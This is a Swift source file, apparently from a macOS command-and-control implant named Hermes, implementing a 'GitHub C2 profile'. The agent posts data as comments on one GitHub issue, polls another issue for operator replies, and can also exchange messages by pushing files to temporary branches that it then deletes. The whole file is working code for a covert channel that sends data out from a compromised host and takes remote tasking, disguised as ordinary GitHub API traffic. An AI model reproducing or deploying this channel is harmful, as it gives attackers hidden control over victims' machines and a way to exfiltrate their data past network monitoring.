//
//  github.swift
//  Hermes
//
//  GitHub C2 Profile Implementation
//  Communicates via GitHub issue comments and file pushes
//

import Foundation

// GitHub Profile implementation conforming to C2Profile protocol
class GitHubProfile: C2Profile {
    private let dispatch = DispatchGroup()
    private var connected: Bool = false
    private var isCheckedIn: Bool = false
    private var agentBranch: String = ""
    private var lastCommentId: Int = 0  // Track last read comment to avoid reading same response twice
    
    var profileName: String {
        return "github"
    }
    
    var isConnected: Bool {
        return connected
    }
    
    // Initialize the GitHub profile
    func initialize() -> Bool {
        // Generate a unique branch name for this agent
        agentBranch = agentConfig.payloadUUID
        connected = true
        return true
    }
    
    // Send data through GitHub
    // Uses issue comments for all communication (checkin and ongoing)
    func send(data: String) -> String {
        // All communication uses issue comments
        // Agent posts to client_issue, server responds on server_issue
        return sendViaIssueComment(data: data)
    }
    
    // Send message via GitHub issue comment (used for initial checkin)
    private func sendViaIssueComment(data: String) -> String {
        // Post comment to client issue
        let postResult = postIssueComment(issueNumber: agentConfig.githubClientIssue, body: data)
        if !postResult {
            return "NO_CONNECT"
        }
        
        // Poll for response on server issue
        var response = ""
        var attempts = 0
        let maxAttempts = 30
        
        while response.isEmpty && attempts < maxAttempts {
            sleep(2)
            response = readLatestIssueComment(issueNumber: agentConfig.githubServerIssue)
            attempts += 1
        }
        
        if response.isEmpty {
            return "NO_CONNECT"
        }
        
        return response
    }
    
    // Send message via file push (used for ongoing communication)
    private func sendViaFilePush(data: String) -> String {
        // Create a new branch for this communication
        let branchName = "\(agentConfig.payloadUUID)-\(generateSessionID(length: 8))"
        
        if !createBranch(branchName: branchName) {
            return "NO_CONNECT"
        }
        
        // Push server.txt with the message
        if !pushFile(branchName: branchName, fileName: "server.txt", content: data, commitMessage: branchName) {
            deleteBranch(branchName: branchName)
            return "NO_CONNECT"
        }
        
        // Poll for client.txt response
        var response = ""
        var attempts = 0
        let maxAttempts = 60
        
        while response.isEmpty && attempts < maxAttempts {
            sleep(2)
            response = readFile(branchName: branchName, fileName: "client.txt")
            attempts += 1
        }
        
        // Cleanup - delete the branch
        deleteBranch(branchName: branchName)
        
        if response.isEmpty {
            return "NO_CONNECT"
        }
        
        return response
    }
    
    // Post a comment to a GitHub issue
    private func postIssueComment(issueNumber: Int, body: String) -> Bool {
        dispatch.enter()
        var success = false
        
        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/issues/\(issueNumber)/comments"
        guard let url = URL(string: urlString) else {
            dispatch.leave()
            return false
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
        request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let payload = ["body": body]
        request.httpBody = try? JSONSerialization.data(withJSONObject: payload)
        
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                success = httpResponse.statusCode == 201
            }
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        
        return success
    }
    
    // Read the latest NEW comment from a GitHub issue (only returns comments newer than lastCommentId)
    private func readLatestIssueComment(issueNumber: Int) -> String {
        dispatch.enter()
        var result = ""
        
        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/issues/\(issueNumber)/comments?sort=created&direction=desc&per_page=1"
        guard let url = URL(string: urlString) else {
            dispatch.leave()
            return ""
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
        request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
            if let data = data,
               let httpResponse = response as? HTTPURLResponse,
               httpResponse.statusCode == 200 {
                if let json = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]],
                   let firstComment = json.first,
                   let commentId = firstComment["id"] as? Int,
                   let body = firstComment["body"] as? String {
                    // Only return the comment if it's newer than the last one we read
                    if commentId > self.lastCommentId {
                        self.lastCommentId = commentId
                        result = body
                    }
                }
            }
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        
        return result
    }
    
    // Create a new branch in the GitHub repo
    private func createBranch(branchName: String) -> Bool {
        // First, get the SHA of the main branch
        guard let mainSha = getBranchSha(branchName: "main") else {
            return false
        }
        
        dispatch.enter()
        var success = false
        
        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/git/refs"
        guard let url = URL(string: urlString) else {
            dispatch.leave()
            return false
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
        request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let payload: [String: Any] = [
            "ref": "refs/heads/\(branchName)",
            "sha": mainSha
        ]
        request.httpBody = try? JSONSerialization.data(withJSONObject: payload)
        
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                success = httpResponse.statusCode == 201
            }
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        
        return success
    }
    
    // Get the SHA of a branch
    private func getBranchSha(branchName: String) -> String? {
        dispatch.enter()
        var sha: String? = nil
        
        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/git/refs/heads/\(branchName)"
        guard let url = URL(string: urlString) else {
            dispatch.leave()
            return nil
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
        request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
            if let data = data,
               let httpResponse = response as? HTTPURLResponse,
               httpResponse.statusCode == 200 {
                if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let object = json["object"] as? [String: Any],
                   let shaValue = object["sha"] as? String {
                    sha = shaValue
                }
            }
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        
        return sha
    }
    
    // Delete a branch
    @discardableResult
    private func deleteBranch(branchName: String) -> Bool {
        dispatch.enter()
        var success = false
        
        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/git/refs/heads/\(branchName)"
        guard let url = URL(string: urlString) else {
            dispatch.leave()
            return false
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "DELETE"
        request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
        request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                success = httpResponse.statusCode == 204
            }
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        
        return success
    }
    
    // Push a file to a branch
    private func pushFile(branchName: String, fileName: String, content: String, commitMessage: String) -> Bool {
        dispatch.enter()
        var success = false
        
        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/contents/\(fileName)"
        guard let url = URL(string: urlString) else {
            dispatch.leave()
            return false
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "PUT"
        request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
        request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        // Base64 encode the content
        let encodedContent = Data(content.utf8).base64EncodedString()
        
        let payload: [String: Any] = [
            "message": commitMessage,
            "content": encodedContent,
            "branch": branchName
        ]
        request.httpBody = try? JSONSerialization.data(withJSONObject: payload)
        
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                success = httpResponse.statusCode == 201 || httpResponse.statusCode == 200
            }
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        
        return success
    }
    
    // Read a file from a branch
    private func readFile(branchName: String, fileName: String) -> String {
        dispatch.enter()
        var result = ""
        
        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/contents/\(fileName)?ref=\(branchName)"
        guard let url = URL(string: urlString) else {
            dispatch.leave()
            return ""
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
        request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
        request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
        
        let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
            if let data = data,
               let httpResponse = response as? HTTPURLResponse,
               httpResponse.statusCode == 200 {
                if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let encodedContent = json["content"] as? String {
                    // Remove newlines from base64 content and decode
                    let cleanedContent = encodedContent.replacingOccurrences(of: "\n", with: "")
                    if let decodedData = Data(base64Encoded: cleanedContent),
                       let decodedString = String(data: decodedData, encoding: .utf8) {
                        result = decodedString
                    }
                }
            }
            self.dispatch.leave()
        }
        task.resume()
        dispatch.wait()
        
        return result
    }
}
